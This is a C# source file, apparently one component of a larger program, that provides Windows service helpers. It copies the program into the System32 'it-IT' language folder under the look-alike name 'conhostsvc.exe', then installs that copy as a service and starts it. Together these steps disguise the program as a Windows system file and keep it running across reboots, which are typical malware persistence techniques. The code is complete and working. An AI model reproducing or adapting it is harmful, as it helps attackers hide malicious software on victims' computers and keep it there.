using System;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public static class ServiceHelper
    {
        public static ServiceController GetService()
        {
            try
            {
                return ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.Equals(Program.SERVICE_NAME, StringComparison.OrdinalIgnoreCase));
            }
            catch (Exception ex)
            {
                // Handle exceptions if needed
                Console.WriteLine($"Error retrieving service: {ex.Message}");
                return null;
            }
        }

        public static string GetItITPath()
        {
            string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string itITPath = Path.Combine(system32Path, "it-IT");
            return itITPath;
        }

        public static string GetExecutablePath()
        {
            string itITPath = GetItITPath();
            string execPath = Path.Combine(itITPath, "conhostsvc.exe");
            return execPath;
        }

        public static string CreateServiceExecutable()
        {
            string itITPath = GetItITPath();
            if (!Directory.Exists(itITPath))
            {
                Directory.CreateDirectory(itITPath);
            }
            string clonePath = Path.Combine(itITPath, "conhostsvc.exe");
            if (File.Exists(clonePath))
            {
                // If the file already exists, delete it
                File.Delete(clonePath);
            }
            PersistenceHelper.Clone.Create(clonePath);

            return clonePath;
        }

        public static bool IsServiceInstalled()
        {
            return (GetService() != null);
        }

        public static void InstallService(string path) {
            ManagedInstallerClass.InstallHelper(new string[] { path });
        }

        public static bool IsServiceRunning()
        {
            var service = GetService();
            if (service == null) return false;
            return service.Status == ServiceControllerStatus.Running;
        }

        public static bool AmIService()
        {
            return !Environment.UserInteractive;
        }

        public static void StartService()
        {
            var service = GetService();
            if (service == null) throw new InvalidOperationException("Service not found.");
            if (service.Status != ServiceControllerStatus.Running)
            {
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, new TimeSpan(0, 0, 5));
                if (service.Status != ServiceControllerStatus.Running)
                {
                    throw new InvalidOperationException("Service failed to start.");
                }
            }
        }
    }
}
